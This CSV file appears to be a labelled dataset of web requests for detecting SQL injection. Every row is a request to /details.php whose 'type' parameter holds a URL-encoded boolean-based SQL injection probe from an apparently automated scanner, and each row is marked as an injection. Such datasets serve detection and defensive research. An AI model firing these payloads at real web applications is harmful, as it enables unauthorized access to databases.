full_url,event_time,hostname,injection
/details.php?prod=5&type=%3F%22%29%20AS%20etoU%20WHERE%209958%3D9958%20AND%204722%3D5999--%20iJdA,1681395121.418612,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%20AS%20fTRH%20WHERE%205136%3D5136%20AND%205104%3D5104--%20BCnO,1681395121.422277,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20AS%20asNZ%20WHERE%206734%3D6734%20AND%209865%3D3360--%20MRlX,1681395121.425902,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20AS%20HWLH%20WHERE%202075%3D2075%20AND%205104%3D5104--%20RvXm,1681395121.429489,192.168.43.6,1
/details.php?prod=5&type=%3F%60%20WHERE%205111%3D5111%20AND%202540%3D2072--%20Elxl,1681395121.433579,192.168.43.6,1
/details.php?prod=5&type=%3F%60%20WHERE%204641%3D4641%20AND%205104%3D5104--%20CWYW,1681395121.436753,192.168.43.6,1
/details.php?prod=5&type=%3F%60%29%20WHERE%202426%3D2426%20AND%208080%3D9689--%20WKOB,1681395121.441306,192.168.43.6,1
/details.php?prod=5&type=%3F%60%29%20WHERE%202361%3D2361%20AND%205104%3D5104--%20uCnl,1681395121.44502,192.168.43.6,1
/details.php?prod=5&type=%3F%60%3D%60%3F%60%20AND%204283%3D3248%20AND%20%60%3F%60%3D%60%3F,1681395121.448284,192.168.43.6,1
/details.php?prod=5&type=%3F%60%3D%60%3F%60%20AND%205104%3D5104%20AND%20%60%3F%60%3D%60%3F,1681395121.452249,192.168.43.6,1
/details.php?prod=5&type=%3F%22%3D%22%3F%22%20AND%203391%3D5434%20AND%20%22%3F%22%3D%22%3F,1681395121.456115,192.168.43.6,1
/details.php?prod=5&type=%3F%22%3D%22%3F%22%20AND%205104%3D5104%20AND%20%22%3F%22%3D%22%3F,1681395121.459335,192.168.43.6,1
/details.php?prod=5&type=%3F%5D-%28SELECT%200%20WHERE%209745%3D9745%20AND%204301%3D3953%29%7C%5B%3F,1681395121.463251,192.168.43.6,1
/details.php?prod=5&type=%3F%5D-%28SELECT%200%20WHERE%206121%3D6121%20AND%205104%3D5104%29%7C%5B%3F,1681395121.467568,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20IN%20BOOLEAN%20MODE%29%20AND%205636%3D2622%23,1681395121.471313,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20IN%20BOOLEAN%20MODE%29%20AND%205104%3D5104%23,1681395121.474963,192.168.43.6,1
/details.php?prod=5&type=-2361,1681395121.479117,192.168.43.6,1
/details.php?prod=5&type=-5227%29%20OR%209681%3D4817--%20OvUw,1681395121.483034,192.168.43.6,1
/details.php?prod=5&type=-4097%29%20OR%206404%3D6404--%20Nsvh,1681395121.486485,192.168.43.6,1
/details.php?prod=5&type=-7182%27%29%20OR%209484%3D3239--%20oOOo,1681395121.49126,192.168.43.6,1
/details.php?prod=5&type=-9822%27%29%20OR%206404%3D6404--%20xEIt,1681395121.495008,192.168.43.6,1
/details.php?prod=5&type=-7581%27%20OR%205856%3D5769--%20xCfK,1681395121.504123,192.168.43.6,1
/details.php?prod=5&type=-3478%27%20OR%206404%3D6404--%20kpBz,1681395121.507809,192.168.43.6,1
/details.php?prod=5&type=-2435%22%20OR%206647%3D5759--%20fcVE,1681395121.512852,192.168.43.6,1
/details.php?prod=5&type=-9112%22%20OR%206404%3D6404--%20vTdo,1681395121.516475,192.168.43.6,1
/details.php?prod=5&type=-6088%29%20OR%201273%3D7287%20AND%20%283757%3D3757,1681395121.523051,192.168.43.6,1
/details.php?prod=5&type=-3101%29%20OR%206404%3D6404%20AND%20%286233%3D6233,1681395121.577907,192.168.43.6,1
/details.php?prod=5&type=-5442%29%29%20OR%209411%3D7773%20AND%20%28%281988%3D1988,1681395121.584382,192.168.43.6,1
/details.php?prod=5&type=-8840%29%29%20OR%206404%3D6404%20AND%20%28%288504%3D8504,1681395121.589905,192.168.43.6,1
/details.php?prod=5&type=-1765%29%29%29%20OR%205559%3D7909%20AND%20%28%28%282211%3D2211,1681395121.596579,192.168.43.6,1
/details.php?prod=5&type=-3069%29%29%29%20OR%206404%3D6404%20AND%20%28%28%283104%3D3104,1681395121.645581,192.168.43.6,1
/details.php?prod=5&type=-3466%20OR%201023%3D9419,1681395121.651951,192.168.43.6,1
/details.php?prod=5&type=-7300%20OR%206404%3D6404,1681395121.656067,192.168.43.6,1
/details.php?prod=5&type=-7433%27%29%20OR%201547%3D3972%20AND%20%28%27ZETi%27%3D%27ZETi,1681395121.716452,192.168.43.6,1
/details.php?prod=5&type=-3845%27%29%20OR%206404%3D6404%20AND%20%28%27CvWq%27%3D%27CvWq,1681395121.720593,192.168.43.6,1
/details.php?prod=5&type=-8076%27%29%29%20OR%206653%3D1314%20AND%20%28%28%27JsxP%27%3D%27JsxP,1681395121.729981,192.168.43.6,1
/details.php?prod=5&type=-1449%27%29%29%20OR%206404%3D6404%20AND%20%28%28%27TszC%27%3D%27TszC,1681395121.733754,192.168.43.6,1
/details.php?prod=5&type=-5193%27%29%29%29%20OR%205818%3D9043%20AND%20%28%28%28%27wGRu%27%3D%27wGRu,1681395121.740048,192.168.43.6,1
/details.php?prod=5&type=-6235%27%29%29%29%20OR%206404%3D6404%20AND%20%28%28%28%27ytvd%27%3D%27ytvd,1681395121.746784,192.168.43.6,1
/details.php?prod=5&type=-5235%27%20OR%201848%3D8076%20AND%20%27iMKc%27%3D%27iMKc,1681395121.7518,192.168.43.6,1
/details.php?prod=5&type=-8113%27%20OR%206404%3D6404%20AND%20%27izdo%27%3D%27izdo,1681395121.755291,192.168.43.6,1
/details.php?prod=5&type=-2270%27%29%20OR%206071%3D1836%20AND%20%28%27uTye%27%20LIKE%20%27uTye,1681395121.759488,192.168.43.6,1
/details.php?prod=5&type=-3217%27%29%20OR%206404%3D6404%20AND%20%28%27LGqp%27%20LIKE%20%27LGqp,1681395121.763455,192.168.43.6,1
/details.php?prod=5&type=-2434%27%29%29%20OR%207628%3D4693%20AND%20%28%28%27qKGo%27%20LIKE%20%27qKGo,1681395121.767323,192.168.43.6,1
/details.php?prod=5&type=-1436%27%29%29%20OR%206404%3D6404%20AND%20%28%28%27CWrd%27%20LIKE%20%27CWrd,1681395121.77195,192.168.43.6,1
/details.php?prod=5&type=-9837%27%29%29%29%20OR%203324%3D8004%20AND%20%28%28%28%27BYBi%27%20LIKE%20%27BYBi,1681395121.776124,192.168.43.6,1
/details.php?prod=5&type=-5070%27%29%29%29%20OR%206404%3D6404%20AND%20%28%28%28%27lcei%27%20LIKE%20%27lcei,1681395121.781397,192.168.43.6,1
/details.php?prod=5&type=-7907%25%27%20OR%208997%3D8187%20AND%20%27WSdI%25%27%3D%27WSdI,1681395121.786262,192.168.43.6,1
/details.php?prod=5&type=-8516%25%27%20OR%206404%3D6404%20AND%20%27kOPB%25%27%3D%27kOPB,1681395121.792675,192.168.43.6,1
/details.php?prod=5&type=-4963%27%20OR%202020%3D5090%20AND%20%27TctT%27%20LIKE%20%27TctT,1681395121.796889,192.168.43.6,1
/details.php?prod=5&type=-5523%27%20OR%206404%3D6404%20AND%20%27Abdz%27%20LIKE%20%27Abdz,1681395121.800387,192.168.43.6,1
/details.php?prod=5&type=-8184%22%29%20OR%207603%3D1221%20AND%20%28%22BzWu%22%3D%22BzWu,1681395121.808543,192.168.43.6,1
/details.php?prod=5&type=-5784%22%29%20OR%206404%3D6404%20AND%20%28%22lfIn%22%3D%22lfIn,1681395121.812258,192.168.43.6,1
/details.php?prod=5&type=-7663%22%29%29%20OR%202155%3D1936%20AND%20%28%28%22JFrL%22%3D%22JFrL,1681395121.816528,192.168.43.6,1
/details.php?prod=5&type=-9203%22%29%29%20OR%206404%3D6404%20AND%20%28%28%22mSbD%22%3D%22mSbD,1681395121.870876,192.168.43.6,1
/details.php?prod=5&type=-2560%22%29%29%29%20OR%205378%3D5754%20AND%20%28%28%28%22aUSm%22%3D%22aUSm,1681395121.875275,192.168.43.6,1
/details.php?prod=5&type=-5103%22%29%29%29%20OR%206404%3D6404%20AND%20%28%28%28%22SiRj%22%3D%22SiRj,1681395121.879956,192.168.43.6,1
/details.php?prod=5&type=-1299%22%20OR%207996%3D6786%20AND%20%22XJyS%22%3D%22XJyS,1681395121.884029,192.168.43.6,1
/details.php?prod=5&type=-9295%22%20OR%206404%3D6404%20AND%20%22TMkH%22%3D%22TMkH,1681395121.890265,192.168.43.6,1
/details.php?prod=5&type=-5360%22%29%20OR%209867%3D8027%20AND%20%28%22Qjmx%22%20LIKE%20%22Qjmx,1681395121.896873,192.168.43.6,1
/details.php?prod=5&type=-8367%22%29%20OR%206404%3D6404%20AND%20%28%22ucnO%22%20LIKE%20%22ucnO,1681395121.901002,192.168.43.6,1
/details.php?prod=5&type=-9563%22%29%29%20OR%204206%3D7304%20AND%20%28%28%22DhaI%22%20LIKE%20%22DhaI,1681395121.909577,192.168.43.6,1
/details.php?prod=5&type=-6964%22%29%29%20OR%206404%3D6404%20AND%20%28%28%22PHxX%22%20LIKE%20%22PHxX,1681395121.914052,192.168.43.6,1
/details.php?prod=5&type=-6000%22%29%29%29%20OR%203335%3D1751%20AND%20%28%28%28%22spdb%22%20LIKE%20%22spdb,1681395121.919331,192.168.43.6,1
/details.php?prod=5&type=-8531%22%29%29%29%20OR%206404%3D6404%20AND%20%28%28%28%22Vmbt%22%20LIKE%20%22Vmbt,1681395121.923453,192.168.43.6,1
/details.php?prod=5&type=-6212%22%20OR%202886%3D2495%20AND%20%22EdQA%22%20LIKE%20%22EdQA,1681395121.928243,192.168.43.6,1
/details.php?prod=5&type=-2129%22%20OR%206404%3D6404%20AND%20%22LLhE%22%20LIKE%20%22LLhE,1681395121.932748,192.168.43.6,1
/details.php?prod=5&type=-2309%20OR%203412%3D2888--%20rpyA,1681395121.936825,192.168.43.6,1
/details.php?prod=5&type=-4646%20OR%206404%3D6404--%20SGsl,1681395121.940568,192.168.43.6,1
/details.php?prod=5&type=-8311%20OR%205516%3D3204%23%20ytqP,1681395121.944711,192.168.43.6,1
/details.php?prod=5&type=-2144%20OR%206404%3D6404%23%20GMlF,1681395121.948044,192.168.43.6,1
/details.php?prod=5&type=-1147%27%20OR%206412%3D3412%20OR%20%27rBNu%27%3D%27dSsv,1681395121.95251,192.168.43.6,1
/details.php?prod=5&type=-3571%27%20OR%206404%3D6404%20OR%20%27fqCr%27%3D%27MmDo,1681395121.955846,192.168.43.6,1
/details.php?prod=5&type=-5064%27%29%20WHERE%206507%3D6507%20OR%208322%3D6795--%20oRbj,1681395121.961873,192.168.43.6,1
/details.php?prod=5&type=-4585%27%29%20WHERE%206904%3D6904%20OR%206404%3D6404--%20RjWS,1681395121.965427,192.168.43.6,1
/details.php?prod=5&type=-2895%22%29%20WHERE%205833%3D5833%20OR%209716%3D4539--%20aWBT,1681395121.969561,192.168.43.6,1
/details.php?prod=5&type=-8501%22%29%20WHERE%205852%3D5852%20OR%206404%3D6404--%20PThp,1681395121.973023,192.168.43.6,1
/details.php?prod=5&type=-8493%29%20WHERE%208544%3D8544%20OR%209133%3D1876--%20PPtP,1681395121.976885,192.168.43.6,1
/details.php?prod=5&type=-1478%29%20WHERE%205474%3D5474%20OR%206404%3D6404--%20MCBU,1681395121.980822,192.168.43.6,1
/details.php?prod=5&type=-7038%27%20WHERE%204799%3D4799%20OR%208917%3D5565--%20pnwL,1681395121.984338,192.168.43.6,1
/details.php?prod=5&type=-2138%27%20WHERE%208202%3D8202%20OR%206404%3D6404--%20JyND,1681395121.988096,192.168.43.6,1
/details.php?prod=5&type=-6256%22%20WHERE%204889%3D4889%20OR%208522%3D9737--%20FiTD,1681395121.992466,192.168.43.6,1
/details.php?prod=5&type=-6895%22%20WHERE%203546%3D3546%20OR%206404%3D6404--%20fCBE,1681395121.995763,192.168.43.6,1
/details.php?prod=5&type=-2183%20WHERE%207966%3D7966%20OR%207303%3D1079--%20ISpf,1681395122.000839,192.168.43.6,1
/details.php?prod=5&type=-7799%20WHERE%205282%3D5282%20OR%206404%3D6404--%20cEGF,1681395122.004966,192.168.43.6,1
/details.php?prod=5&type=-4622%27%29%29%20AS%20GQLM%20WHERE%202151%3D2151%20OR%208854%3D1106--%20hSvs,1681395122.008336,192.168.43.6,1
/details.php?prod=5&type=-8845%27%29%29%20AS%20sGPL%20WHERE%202322%3D2322%20OR%206404%3D6404--%20OLuG,1681395122.012281,192.168.43.6,1
/details.php?prod=5&type=-2491%22%29%29%20AS%20qxhf%20WHERE%203850%3D3850%20OR%208855%3D3620--%20UpmT,1681395122.016414,192.168.43.6,1
/details.php?prod=5&type=-9930%22%29%29%20AS%20yMQm%20WHERE%202278%3D2278%20OR%206404%3D6404--%20mDfv,1681395122.02027,192.168.43.6,1
/details.php?prod=5&type=-3219%29%29%20AS%20bTFT%20WHERE%204177%3D4177%20OR%203931%3D3136--%20PuVL,1681395122.024359,192.168.43.6,1
/details.php?prod=5&type=-5497%29%29%20AS%20hjmn%20WHERE%208171%3D8171%20OR%206404%3D6404--%20BDqz,1681395122.027683,192.168.43.6,1
/details.php?prod=5&type=-4401%27%29%20AS%20LTgN%20WHERE%207145%3D7145%20OR%205743%3D1619--%20hYtp,1681395122.031706,192.168.43.6,1
/details.php?prod=5&type=-6287%27%29%20AS%20OMbe%20WHERE%202885%3D2885%20OR%206404%3D6404--%20Bxna,1681395122.035441,192.168.43.6,1
/details.php?prod=5&type=-3515%22%29%20AS%20OjuM%20WHERE%208809%3D8809%20OR%206832%3D3858--%20PVzm,1681395122.03987,192.168.43.6,1
/details.php?prod=5&type=-9578%22%29%20AS%20WdBv%20WHERE%201326%3D1326%20OR%206404%3D6404--%20rwXh,1681395122.045793,192.168.43.6,1
/details.php?prod=5&type=-6762%29%20AS%20Lelv%20WHERE%208102%3D8102%20OR%204094%3D8455--%20CFWu,1681395122.050589,192.168.43.6,1
/details.php?prod=5&type=-4823%29%20AS%20Mtlo%20WHERE%204721%3D4721%20OR%206404%3D6404--%20xPdJ,1681395122.053873,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20OR%20NOT%206029%3D3218--%20AIIp,1681395122.058131,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20OR%20NOT%205387%3D5387--%20LQoq,1681395122.062744,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20OR%20NOT%202591%3D2985--%20AnCw,1681395122.066623,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20OR%20NOT%205387%3D5387--%20ObOi,1681395122.070794,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20OR%20NOT%205528%3D3584--%20GUSZ,1681395122.076029,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20OR%20NOT%205387%3D5387--%20RzTB,1681395122.087978,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20OR%20NOT%202345%3D7413--%20Bhhg,1681395122.093685,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20OR%20NOT%205387%3D5387--%20Azob,1681395122.099297,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20OR%20NOT%207930%3D5677%20AND%20%288029%3D8029,1681395122.104159,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20OR%20NOT%205387%3D5387%20AND%20%283873%3D3873,1681395122.164656,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%20OR%20NOT%203503%3D7857%20AND%20%28%282202%3D2202,1681395122.170439,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%20OR%20NOT%205387%3D5387%20AND%20%28%289144%3D9144,1681395122.174526,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%29%20OR%20NOT%208554%3D4370%20AND%20%28%28%286631%3D6631,1681395122.178426,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%29%20OR%20NOT%205387%3D5387%20AND%20%28%28%283726%3D3726,1681395122.225906,192.168.43.6,1
/details.php?prod=5&type=%3F%20OR%20NOT%202276%3D4699,1681395122.233979,192.168.43.6,1
/details.php?prod=5&type=%3F%20OR%20NOT%205387%3D5387,1681395122.237883,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20OR%20NOT%201271%3D9138%20AND%20%28%27yYvH%27%3D%27yYvH,1681395122.242061,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20OR%20NOT%205387%3D5387%20AND%20%28%27DmZL%27%3D%27DmZL,1681395122.289894,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%20OR%20NOT%206705%3D6981%20AND%20%28%28%27VNRs%27%3D%27VNRs,1681395122.293914,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%20OR%20NOT%205387%3D5387%20AND%20%28%28%27JnKI%27%3D%27JnKI,1681395122.297627,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%29%20OR%20NOT%208206%3D3706%20AND%20%28%28%28%27lxPg%27%3D%27lxPg,1681395122.302783,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%29%20OR%20NOT%205387%3D5387%20AND%20%28%28%28%27cmze%27%3D%27cmze,1681395122.306704,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20OR%20NOT%206917%3D3569%20AND%20%27iJRV%27%3D%27iJRV,1681395122.311272,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20OR%20NOT%205387%3D5387%20AND%20%27DEjy%27%3D%27DEjy,1681395122.316217,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20OR%20NOT%209592%3D6435%20AND%20%28%27gNXm%27%20LIKE%20%27gNXm,1681395122.323071,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20OR%20NOT%205387%3D5387%20AND%20%28%27DlBL%27%20LIKE%20%27DlBL,1681395122.32747,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%20OR%20NOT%201253%3D8643%20AND%20%28%28%27pQEU%27%20LIKE%20%27pQEU,1681395122.334664,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%20OR%20NOT%205387%3D5387%20AND%20%28%28%27jcmh%27%20LIKE%20%27jcmh,1681395122.338458,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%29%20OR%20NOT%208689%3D3501%20AND%20%28%28%28%27vZOP%27%20LIKE%20%27vZOP,1681395122.343204,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%29%20OR%20NOT%205387%3D5387%20AND%20%28%28%28%27CaTo%27%20LIKE%20%27CaTo,1681395122.346572,192.168.43.6,1
/details.php?prod=5&type=%3F%25%27%20OR%20NOT%202768%3D2292%20AND%20%27fmDu%25%27%3D%27fmDu,1681395122.351424,192.168.43.6,1
/details.php?prod=5&type=%3F%25%27%20OR%20NOT%205387%3D5387%20AND%20%27ZSsO%25%27%3D%27ZSsO,1681395122.355339,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20OR%20NOT%205032%3D5541%20AND%20%27iwll%27%20LIKE%20%27iwll,1681395122.359878,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20OR%20NOT%205387%3D5387%20AND%20%27lFAk%27%20LIKE%20%27lFAk,1681395122.363741,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%20OR%20NOT%202127%3D1503%20AND%20%28%22jGlP%22%3D%22jGlP,1681395122.367727,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%20OR%20NOT%205387%3D5387%20AND%20%28%22nyxG%22%3D%22nyxG,1681395122.371818,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%20OR%20NOT%204781%3D2547%20AND%20%28%28%22Qwpq%22%3D%22Qwpq,1681395122.37581,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%20OR%20NOT%205387%3D5387%20AND%20%28%28%22lJAI%22%3D%22lJAI,1681395122.378962,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%29%20OR%20NOT%207494%3D9628%20AND%20%28%28%28%22Klma%22%3D%22Klma,1681395122.383128,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%29%20OR%20NOT%205387%3D5387%20AND%20%28%28%28%22MBOv%22%3D%22MBOv,1681395122.389335,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20OR%20NOT%208399%3D5536%20AND%20%22szZl%22%3D%22szZl,1681395122.392905,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20OR%20NOT%205387%3D5387%20AND%20%22NSSB%22%3D%22NSSB,1681395122.396633,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%20OR%20NOT%207673%3D2424%20AND%20%28%22oVtD%22%20LIKE%20%22oVtD,1681395122.401478,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%20OR%20NOT%205387%3D5387%20AND%20%28%22CpBS%22%20LIKE%20%22CpBS,1681395122.406036,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%20OR%20NOT%204711%3D2989%20AND%20%28%28%22nqms%22%20LIKE%20%22nqms,1681395122.467414,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%20OR%20NOT%205387%3D5387%20AND%20%28%28%22mwvy%22%20LIKE%20%22mwvy,1681395122.472313,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%29%20OR%20NOT%201891%3D4837%20AND%20%28%28%28%22DhdK%22%20LIKE%20%22DhdK,1681395122.476806,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%29%20OR%20NOT%205387%3D5387%20AND%20%28%28%28%22yohG%22%20LIKE%20%22yohG,1681395122.480602,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20OR%20NOT%202716%3D6072%20AND%20%22efEC%22%20LIKE%20%22efEC,1681395122.485565,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20OR%20NOT%205387%3D5387%20AND%20%22LdAy%22%20LIKE%20%22LdAy,1681395122.490792,192.168.43.6,1
/details.php?prod=5&type=%3F%20OR%20NOT%202248%3D9648--%20KIuf,1681395122.497268,192.168.43.6,1
/details.php?prod=5&type=%3F%20OR%20NOT%205387%3D5387--%20EFSK,1681395122.501441,192.168.43.6,1
/details.php?prod=5&type=%3F%20OR%20NOT%204121%3D3050%23%20Amyr,1681395122.506625,192.168.43.6,1
/details.php?prod=5&type=%3F%20OR%20NOT%205387%3D5387%23%20agBo,1681395122.510545,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20OR%20NOT%204511%3D6354%20OR%20%27Ddab%27%3D%27XCVv,1681395122.515132,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20OR%20NOT%205387%3D5387%20OR%20%27YFXo%27%3D%27MUok,1681395122.518968,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20WHERE%204450%3D4450%20OR%20NOT%208619%3D8022--%20jYdg,1681395122.52331,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20WHERE%207283%3D7283%20OR%20NOT%205387%3D5387--%20jtKB,1681395122.527039,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%20WHERE%203458%3D3458%20OR%20NOT%201000%3D2495--%20KwuO,1681395122.533238,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%20WHERE%205954%3D5954%20OR%20NOT%205387%3D5387--%20Vyyc,1681395122.53731,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20WHERE%206823%3D6823%20OR%20NOT%202526%3D9102--%20hjPs,1681395122.541199,192.168.43.6,1
/details.php?prod=5&type=%3F%29%20WHERE%201339%3D1339%20OR%20NOT%205387%3D5387--%20oRGJ,1681395122.545209,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20WHERE%203450%3D3450%20OR%20NOT%205196%3D7802--%20aLDg,1681395122.549471,192.168.43.6,1
/details.php?prod=5&type=%3F%27%20WHERE%202495%3D2495%20OR%20NOT%205387%3D5387--%20LXiy,1681395122.55317,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20WHERE%206434%3D6434%20OR%20NOT%205247%3D8986--%20TJBm,1681395122.557132,192.168.43.6,1
/details.php?prod=5&type=%3F%22%20WHERE%209082%3D9082%20OR%20NOT%205387%3D5387--%20jiBY,1681395122.560883,192.168.43.6,1
/details.php?prod=5&type=%3F%20WHERE%201966%3D1966%20OR%20NOT%201530%3D5006--%20Tdqz,1681395122.564666,192.168.43.6,1
/details.php?prod=5&type=%3F%20WHERE%206478%3D6478%20OR%20NOT%205387%3D5387--%20iyuE,1681395122.568572,192.168.43.6,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x59675172%20WHERE%202856%3D2856%20OR%20NOT%205913%3D4917%29%7C%7C%27,1681395122.572957,192.168.43.6,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x4d526a61%20WHERE%206249%3D6249%20OR%20NOT%205387%3D5387%29%7C%7C%27,1681395122.576042,192.168.43.6,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x4d695569%20FROM%20DUAL%20WHERE%201522%3D1522%20OR%20NOT%201457%3D6804%29%7C%7C%27,1681395122.580076,192.168.43.6,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x544a5562%20FROM%20DUAL%20WHERE%201077%3D1077%20OR%20NOT%205387%3D5387%29%7C%7C%27,1681395122.583991,192.168.43.6,1
/details.php?prod=5&type=%3F%27%2B%28SELECT%200x7166584f%20WHERE%202087%3D2087%20OR%20NOT%208954%3D1892%29%2B%27,1681395122.587708,192.168.43.6,1
/details.php?prod=5&type=%3F%27%2B%28SELECT%200x52684771%20WHERE%207341%3D7341%20OR%20NOT%205387%3D5387%29%2B%27,1681395122.592097,192.168.43.6,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x554f455a%20FROM%20DUAL%20WHERE%202420%3D2420%20OR%20NOT%201270%3D2832%29%7C%7C,1681395122.596346,192.168.43.6,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x4a755150%20FROM%20DUAL%20WHERE%208319%3D8319%20OR%20NOT%205387%3D5387%29%7C%7C,1681395122.599683,192.168.43.6,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x7a687744%20WHERE%205753%3D5753%20OR%20NOT%206453%3D4622%29%7C%7C,1681395122.604086,192.168.43.6,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x41594462%20WHERE%209634%3D9634%20OR%20NOT%205387%3D5387%29%7C%7C,1681395122.6078,192.168.43.6,1
/details.php?prod=5&type=%3F%2B%28SELECT%20xCte%20WHERE%207461%3D7461%20OR%20NOT%207300%3D8658%29%2B,1681395122.611481,192.168.43.6,1
/details.php?prod=5&type=%3F%2B%28SELECT%20fjnC%20WHERE%204823%3D4823%20OR%20NOT%205387%3D5387%29%2B,1681395122.615221,192.168.43.6,1
/details.php?prod=5&type=%3F%2B%28SELECT%200x794e6559%20WHERE%202197%3D2197%20OR%20NOT%209826%3D9316%29%2B,1681395122.619142,192.168.43.6,1
/details.php?prod=5&type=%3F%2B%28SELECT%200x64567475%20WHERE%205154%3D5154%20OR%20NOT%205387%3D5387%29%2B,1681395122.622503,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%20AS%20ipTX%20WHERE%202294%3D2294%20OR%20NOT%203233%3D1773--%20vgyG,1681395122.626633,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%20AS%20hgjw%20WHERE%206164%3D6164%20OR%20NOT%205387%3D5387--%20FaIr,1681395122.630432,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%20AS%20kJaN%20WHERE%202921%3D2921%20OR%20NOT%203802%3D7544--%20XEnU,1681395122.634208,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%20AS%20Dkrh%20WHERE%205182%3D5182%20OR%20NOT%205387%3D5387--%20ndff,1681395122.637632,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%20AS%20ZOzO%20WHERE%202856%3D2856%20OR%20NOT%209202%3D7387--%20NreR,1681395122.64209,192.168.43.6,1
